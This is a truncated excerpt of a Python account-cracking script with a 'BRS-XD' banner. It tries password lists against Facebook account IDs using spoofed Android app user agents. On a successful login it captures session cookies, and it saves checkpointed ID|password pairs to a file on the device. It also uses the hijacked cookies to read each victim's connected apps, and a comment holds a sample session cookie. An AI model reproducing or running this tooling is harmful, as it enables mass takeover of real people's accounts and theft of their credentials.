...
def cek_apk(session, coki):
    def get_apk_details(url, status, title):
        w = session.get(url, cookies={"cookie": coki}).text
        sop = BeautifulSoup(w, "html.parser")
        x = sop.find("form", method="post")
        game = [i.text for i in x.find_all("h3")]
        if len(game) == 0:
            print(f'\r %s[%s!%s] %sSorry there is no {status} Apk%s  ' % (N, M, N, M, N))
        else:
            print(f'\r 🎮  %sYour {title} Application Details :' % (H))
            for i in range(len(game)):
                print(f"\r %s%s. %s%s" % (N, i + 1, game[i].replace(f"{status} pada", f" {status} pada"), N))

    get_apk_details("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", "Active", "Active")
    get_apk_details("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", "Expired", "Expired")
...
BBBBBBBBBBBBBBBBB   RRRRRRRR     RRRRRRR SSSSSSSSSSSSSSS   
 ...
 \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVersion : 3.2
 \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [BRS-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in DJS:
                                coki1=session.cookies.get_dict()
                                coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [BRS-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [BRS-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        try:
            ...
            for pw in passlist:
                ...
                ua_string = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+"Dalvik/2.1.0 (Linux; U; Android 11; SM-J410G Build/LRX22C) [FBAN/MessengerLite;FBAV/90.0.0.15.89;FBPN/com.facebook.mlite;FBLC/sv_SE;FBBV/594415958;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/SM-J410G;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1233,height=1568};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 9.0.1; SM-A326B Build/LRX22C) [FBAN/Orca-Android;FBAV/412.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/553626861;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/SM-A326B;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1073,height=1614};FB_FW/1;]"+"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-S134DL Build/LRX22C) [FBAN/FB4A;FBAV/385.0.0.15.89;FBPN/com.facebook.katana;FBLC/sv_SE;FBBV/665639198;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/SM-S134DL;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=829,height=1570};FB_FW/1;]"
                li = ['28','29','210']
...
def api2(ids,names,passlist):
    ...
    # 'cookie': 'datr=spkGacCyUvDpdhZtYJ4u2wdr; sb=spkGaZAi7BS-_N4vOQBuPHmL; m_pixel_ratio=2.0562500953674316; wd=351x784; fr=0rpIGkn5LNkOg3TZJ..BpBpmy..AAA.0.0.BpBpow.AWdAciIucj0nYRgEoBb3v2aoYx4',
    ...
    'viewport-width': '980',
                        ...
                        if 'your account was locked' in po:
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/BRS/BRS.py-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
